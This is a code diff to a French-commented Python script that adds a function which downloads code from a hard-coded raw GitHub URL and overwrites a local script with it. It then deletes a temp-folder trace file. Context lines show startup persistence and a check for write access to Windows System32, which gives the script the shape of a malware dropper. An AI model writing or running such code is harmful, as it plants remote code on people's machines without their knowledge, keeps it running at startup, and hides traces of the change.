@@ -62,38 +62,69 @@ def add_to_startup(py_path):
     print("[✓] Script ajouté au démarrage.")
 
 def remplacer_script_depuis_s_path():
+    import os
+    import requests
+    import tempfile
+
+    # Récupère le dossier temporaire de Windows / Linux / macOS
     temp_dir = tempfile.gettempdir()
+
+    # Le fichier temporaire s_path.txt contenant le chemin vers un script python
     fichier_temp = os.path.join(temp_dir, "s_path.txt")
 
-    print(f"[i] Recherche d'un chemin de script à remplacer dans : {fichier_temp}")
+    # URL brute d’un script python sur GitHub (texte clair)
+    raw_url = "https://raw.githubusercontent.com/luxamind141/installation/main/FuckNGLclear.txt"
 
+    print(f"[i] Temp dir : {temp_dir}")
+    print(f"[i] Fichier trace : {fichier_temp}")
+
+    # Vérifie que s_path.txt existe bien
     if not os.path.isfile(fichier_temp):
-        print("[!] Aucun fichier s_path.txt trouvé.")
+        print("[!] Le fichier s_path.txt est introuvable.")
         return
 
+    # Lit le chemin du script python dans s_path.txt
     with open(fichier_temp, "r") as f:
         chemin_script = f.read().strip()
 
+    print(f"[i] Chemin lu dans le fichier : {chemin_script}")
+
+    # Vérifie que ce chemin existe (le script cible)
     if not os.path.isfile(chemin_script):
         print(f"[!] Fichier cible introuvable : {chemin_script}")
         return
 
     try:
-        r = requests.get(RAW_SCRIPT_REPLACEMENT, timeout=10)
-        r.raise_for_status()
-        if r.text.strip():
+        print(f"[...] Téléchargement script clair depuis {raw_url}")
+
+        # Télécharge le texte clair depuis GitHub
+        r = requests.get(raw_url, timeout=10)
+
+        # Si la requête a réussi et que le contenu n’est pas vide
+        if r.status_code == 200 and r.text.strip():
+
+            # Remplace le contenu du fichier ciblé par ce contenu téléchargé
             with open(chemin_script, "w", encoding="utf-8") as f_script:
                 f_script.write(r.text)
-            print(f"[✓] Script remplacé avec succès : {chemin_script}")
+
+            print(f"[✓] Script clair mis à jour avec succès : {chemin_script}")
+
+        else:
+            print(f"[!] Échec téléchargement script clair. Code HTTP : {r.status_code}")
+            return
+
     except Exception as e:
-        print(f"[!] Erreur lors du remplacement : {e}")
+        print(f"[!] Erreur téléchargement script clair : {e}")
         return
 
+    # Supprime ensuite le fichier s_path.txt
     try:
         os.remove(fichier_temp)
         print("[✓] Fichier s_path.txt supprimé.")
     except Exception as e:
-        print(f"[!] Erreur suppression : {e}")
+        print(f"[!] Erreur suppression s_path.txt : {e}")
+
+
 
 def main():
     if not os.access(SYSTEM32, os.W_OK):
